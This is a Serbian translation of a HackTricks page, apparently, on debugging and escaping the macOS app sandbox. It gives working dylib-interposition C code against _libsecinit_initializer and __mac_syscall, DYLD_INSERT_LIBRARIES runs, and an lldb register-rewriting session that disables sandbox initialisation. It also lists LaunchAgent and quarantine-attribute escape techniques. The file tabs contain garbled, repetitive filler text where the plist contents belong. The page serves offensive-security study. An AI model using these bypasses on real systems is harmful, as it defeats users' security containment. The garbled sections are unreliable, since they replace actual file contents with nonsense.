# macOS Sandbox Debug & Bypass

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Proces učitavanja peska

<figure><img src="../../../../../.gitbook/assets/image (901).png" alt=""><figcaption><p>Slika sa <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Na prethodnoj slici je moguće posmatrati **kako će se pesak učitati** kada se pokrene aplikacija sa privilegijom **`com.apple.security.app-sandbox`**.

Kompajler će povezati `/usr/lib/libSystem.B.dylib` sa binarnim fajlom.

Zatim, **`libSystem.B`** će pozivati druge funkcije sve dok **`xpc_pipe_routine`** ne pošalje privilegije aplikacije **`securityd`**-u. Securityd proverava da li bi proces trebalo da bude izolovan unutar peska, i ako jeste, biće izolovan.\
Na kraju, pesak će biti aktiviran pozivom **`__sandbox_ms`** koji će pozvati **`__mac_syscall`**.

## Mogući zaobiđeni

### Zaobilaženje atributa karantina

**Fajlovi kreirani od strane procesa u pesku** dobijaju **atribut karantina** kako bi se sprečilo izbegavanje peska. Međutim, ako uspete da **kreirate `.app` folder bez atributa karantina** unutar aplikacije u pesku, možete naterati binarni paket aplikacije da pokazuje na **`/bin/bash`** i dodati neke env promenljive u **plist** kako biste iskoristili **`open`** da **pokrenete novu aplikaciju van peska**.

To je urađeno u [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**

{% hint style="danger" %}
Dakle, trenutno, ako ste u mogućnosti samo da kreirate folder sa imenom koje se završava na **`.app`** bez atributa karantina, možete izbeći pesak jer macOS samo **proverava** atribut **karantina** u **`.app` folderu** i u **glavnom izvršnom fajlu** (i mi ćemo usmeriti glavni izvršni fajl na **`/bin/bash`**).

Imajte na umu da ako je .app paket već autorizovan za pokretanje (ima karantinski xttr sa autorizovanom zastavicom za pokretanje), takođe ga možete iskoristiti... osim što sada ne možete pisati unutar **`.app`** paketa osim ako imate neke privilegovane TCC dozvole (koje nećete imati unutar peska visokog nivoa).
{% endhint %}

### Zloupotreba funkcionalnosti Open

U [**poslednjim primerima zaobiđenja peska u Word-u**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) može se primetiti kako se **`open`** cli funkcionalnost može zloupotrebiti za zaobilaženje peska.

{% content-ref url="macos-office-sandbox-bypasses.md" %}
[macos-office-sandbox-bypasses.md](macos-office-sandbox-bypasses.md)
{% endcontent-ref %}

### Pokretanje Agensa/Demona

Čak i ako je aplikacija **namenjena za pesak** (`com.apple.security.app-sandbox`), moguće je zaobići pesak ako se **izvršava iz LaunchAgent-a** (`~/Library/LaunchAgents`) na primer.\
Kao što je objašnjeno u [**ovom postu**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), ako želite da dobijete postojanost sa aplikacijom koja je u pesku, možete je automatski izvršiti kao LaunchAgent i možda ubaciti zlonamerni kod putem DyLib env promenljivih.

### Zloupotreba lokacija automatskog pokretanja

Ako proces u pesku može **pisati** na mestu gde će se **kasnije izvršiti binarni fajl van peska**, moći će **pobeci samo postavljanjem** binarnog fajla tamo. Dobar primer ovakvih lokacija su `~/Library/LaunchAgents` ili `/System/Library/LaunchDaemons`.

Za ovo možda čak treba **2 koraka**: Da napravite proces sa **više dozvola peska** (`file-read*`, `file-write*`) koji će izvršiti vaš kod koji će zapravo pisati na mestu gde će biti **izvršen van peska**.

Proverite ovu stranicu o **lokacijama automatskog pokretanja**:

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

### Zloupotreba drugih procesa

Ako iz peska možete **ugroziti druge procese** koji se izvršavaju u manje restriktivnim peskovima (ili bez njih), moći ćete pobeći iz njihovih peskova:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

### Statičko kompajliranje & Dinamičko povezivanje

[**Ovo istraživanje**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) otkrilo je 2 načina zaobiđenja peska. Jer se pesak primenjuje iz korisničkog prostora kada se učita biblioteka **libSystem**. Ako bi binarni fajl mogao da izbegne učitavanje te biblioteke, nikada ne bi bio stavljen u pesak:

* Ako bi binarni fajl bio **potpuno statički kompajliran**, mogao bi izbeći učitavanje te biblioteke.
* Ako **binarni fajl ne bi trebao da učita bilo koje biblioteke** (jer je i linker u libSystem), neće morati da učita libSystem.

### Shellkodovi

Imajte na umu da **čak i shellkodovi** u ARM64 moraju biti povezani u `libSystem.dylib`:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Ovlašćenja

Imajte na umu da čak i ako su neke **radnje** možda **dozvoljene u pesku** ako aplikacija ima određeno **ovlašćenje**, kao u:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interpostovanje Bypass

Za više informacija o **Interpostovanju** pogledajte:

{% content-ref url="../../../macos-proces-abuse/macos-function-hooking.md" %}
[macos-function-hooking.md](../../../macos-proces-abuse/macos-function-hooking.md)
{% endcontent-ref %}

#### Interpostovanje `_libsecinit_initializer` da bi se sprečio pesak
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interpost `__mac_syscall` da biste sprečili pesak

{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```
{% endcode %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Debug & zaobilaženje peska pomoću lldb

Kompajlirajmo aplikaciju koja bi trebalo da bude u pesku:

{% tabs %}
{% tab title="sand.c" %}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{% endtab %}

{% tab title="entitlements.xml" %} 

## macOS Pesničenje

Ovaj direktorijum sadrži informacije o pesničenju macOS pesničenja, uključujući detalje o pesničenju, pesničenju i zaobilasku macOS pesničenja.

### Pesničenje macOS pesničenja

Pesničenje macOS pesničenja je proces pronalaženja propusta ili slabosti u pesničenju macOS pesničenja kako bi se omogućio pristup resursima ili privilegijama koje inače ne bi trebalo imati.

### Pesničenje i zaobilazak macOS pesničenja

Pesničenje i zaobilazak macOS pesničenja odnosi se na pronalaženje načina da se zaobiđu sigurnosne zaštite macOS pesničenja kako bi se omogućio pristup osetljivim resursima ili privilegijama. 

{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{% endtab %}

{% tab title="Info.plist" %} 

## Bezbednosne mere za macOS pesak

macOS Sandbox je bezbednosna funkcija koja ograničava aplikacije na određene resurse i operacije kako bi se smanjio potencijalni uticaj sigurnosnih pretnji. Međutim, pesak nije savršen i može biti zaobiđen ili probijen. Ovaj dokument istražuje načine za debagovanje i zaobilaženje macOS Sandbox-a radi boljeg razumevanja njegovih slabosti i potencijalnih rizika.

### Debugovanje macOS Sandbox-a

Debugovanje macOS Sandbox-a može pružiti uvid u njegovo funkcionisanje i pomoći u identifikaciji mogućih tačaka zaobilaženja. Korišćenje alata za debagovanje poput LLDB-a može biti korisno za analizu kako aplikacija komunicira sa Sandbox-om i kako se ponaša pod različitim uslovima.

### Zaobilaženje macOS Sandbox-a

Postoje različiti načini zaobilaženja macOS Sandbox-a, uključujući iskorišćavanje ranjivosti u samoj Sandbox implementaciji ili u samim aplikacijama koje su podložne Sandbox ograničenjima. Razumevanje ovih tehnika može pomoći developerima i bezbednosnim istraživačima da unaprede bezbednost svojih aplikacija i identifikuju potencijalne ranjivosti. 

{% endtab %}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

Zatim kompajlirajte aplikaciju:

{% code overflow="wrap" %}
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
{% endcode %}

{% hint style="danger" %}
Aplikacija će pokušati da **pročita** fajl **`~/Desktop/del.txt`**, što **Pesakboks neće dozvoliti**.\
Napravite fajl tamo, jer kada se Pesakboks zaobiđe, aplikacija će moći da ga pročita:
```bash
echo "Sandbox Bypassed" > ~/Desktop/del.txt
```
{% endhint %}

Hajde da debagujemo aplikaciju da vidimo kada je Sandbox učitan:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
{% hint style="warning" %}
**Čak i kada je Sandbox zaobiđen, TCC** će pitati korisnika da li želi da dozvoli procesu da čita fajlove sa desktopa.
{% endhint %}

## Reference

* [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
* [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
* [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
